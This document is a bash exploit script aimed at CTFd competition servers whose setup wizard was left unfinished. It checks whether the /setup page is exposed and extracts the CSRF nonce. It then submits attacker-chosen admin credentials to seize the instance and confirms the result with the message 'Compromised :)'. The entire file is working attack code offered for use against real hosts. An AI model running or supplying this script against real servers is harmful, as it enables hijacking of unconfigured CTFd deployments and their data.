#!/bin/bash
clear
# Read target and port separately
read -p "Enter Target Address: " target
read -p "Enter Port: " port

# Validate port range
if [[ $port -lt 65536 && $port -gt 0 ]]; then
    # Download page to check <title>, <h1> and nonce values.
    curl --silent -H 'Cookie: session=00000000-0000-0000-0000-000000000000' \
        -b 'session=00000000-0000-0000-0000-000000000000' \
        "$target:$port/setup" > preexp
else
    echo "Incorrect Port."
    exit 1
fi

# Check for <title> and <h1> values
titleCheck=$(grep '<title>CTFd</title>' preexp)
headerOneCheck=$(grep '<h1>Setup</h1>' preexp)

# Extract nonce value using awk and sed
nonce=$(grep 'var csrf_nonce' preexp | awk '{print $4}' | sed 's/.//;s/..$//')

# Clean up preexp file
rm preexp

# Check if title and header match the expected values
if [[ "$titleCheck" == *"<title>CTFd</title>"* && "$headerOneCheck" == *"<h1>Setup</h1>"* ]]; then
    read -p "Target is Vulnerable, Would you Like to Attack? (Y/n): " attack

    if [[ "$attack" == 'y' || "$attack" == 'Y' ]]; then
        clear
        read -p 'CTF Name: ' ctfName
        read -p 'Admin Username: ' adminName
        read -p 'Admin Email: ' adminEmail
        read -p 'Admin Password: ' adminPassword
        read -p 'User Mode (teams/users): ' userMode
        clear
        echo "Working on it..."

        # Send values to $target
        curl --silent -i -X POST -H 'Cookie: session=00000000-0000-0000-0000-000000000000' \
            -b 'session=00000000-0000-0000-0000-000000000000' \
            --data "nonce=$nonce&ctf_name=$ctfName&name=$adminName&email=$adminEmail&password=$adminPassword&user_mode=$userMode" \
            "http://$target:$port/setup"

        clear
        echo "Attack Executed!"

        # Verify successful exploit
        curl --silent -H 'Cookie: session=00000000-0000-0000-0000-000000000000' \
            -b 'session=00000000-0000-0000-0000-000000000000' \
            "$target:$port/setup" > postexp

        titleCheck=$(grep '<title>CTFd</title>' postexp)
        headerOneCheck=$(grep '<h1>Setup</h1>' postexp)
        rm postexp

        if [[ "$titleCheck" != *"<title>CTFd</title>"* || "$headerOneCheck" != *"<h1>Setup</h1>"* ]]; then
            clear
            echo "CTFd Server Hosted @ $target has been Compromised :)"
        else
            clear
            echo "Something went Wrong, Try Again."
        fi
    fi
else
    echo "Something went Wrong, Try Again."
fi